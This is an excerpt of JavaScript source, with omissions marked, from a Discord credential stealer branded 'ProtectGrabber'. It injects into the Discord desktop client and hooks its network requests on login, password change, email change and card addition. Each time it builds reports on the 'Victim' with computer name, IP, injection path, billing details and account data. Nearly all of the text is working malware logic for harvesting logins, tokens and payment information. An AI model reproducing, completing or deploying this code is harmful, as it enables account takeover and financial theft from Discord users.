...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/Protect")) fs.rmdirSync(__dirname + "/Protect")
    var ip = await getIP()
    if (!token) {
        var params = await makeEmbed({
            title: "Protect Initalized",
            fields: [{
                name: "Injection Info",
                value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\``,
                inline: !1
        ...
        if (!user.avatar) var userAvatar = "https://cdn.discordapp.com/attachments/1037711213771108474/1077015758980264006/shield-removebg-preview.png"
        ...
        var params = await makeEmbed({
            ...
            fields: [{
                ...
                name: "@Copyright",
                value: `[ProtectGrabber 2023](Made By furax124)`,
                inline: !0
            }, {
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: "Protect User log out (User not Logged in before)",
                fields: [{
                    name: "Injection Info",
            ...
            userAvatar = userAvatar ?? await getGifOrPNG(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}`)
            var params = await makeEmbed({
                title: "Protect Victim got logged out",
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    inline: !1
...
electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async (request, callback) => {
    ...
    switch (true) {
        case request.url.endsWith("login"):
            ...
            var params = await makeEmbed({
                title: "Protect User Login",
                description: "[**Oh you have Protected someone**](ProtectGrabber)",
                color: config['embed-color'],
                fields: [{
                    name: "Injection Info",
                    value: `\`\`\`diff\n- Computer Name: \n${computerName}\n\n- Injection Path: \n${__dirname}\n\n- IP: \n${ip}\n\`\`\`\n\n[Download pfp](${userAvatar})`,
                    ...
                    name: "@Copyright",
                    value: `[ProtectGrabber](Made By furax124)`,
                    inline: !0
                }, {
                    name: "Billing <a:billing:1041641103629234196>",
                    value: `${Billings}`,
        ...
        case request.url.endsWith("users/@me"):
            ...
            if (data.new_password) {
                var params = await makeEmbed({
                    title: "Protect Detect Password Changed",
                    description: "[**Oh you have Protected someone**](ProtectGrabber)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
            ...
            if (data.email) {
                var params = await makeEmbed({
                    title: "Protect Detect Email Changed",
                    description: "[**Oh you have Protected someone**](ProtectGrabber)",
                    color: config['embed-color'],
                    fields: [{
                        name: "Injection Info",
                        ...
                        name: "@Copyright",
                        value: `[Protect Grabber 2023](Made By furax124)`,
                        inline: !0
                    }, {
                        name: "Billing <a:billing:1041641103629234196>",
                        value: `${Billings}`,
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "Protect User Credit Card Added",
                description: `
                **IP:** ${ip}\n\n
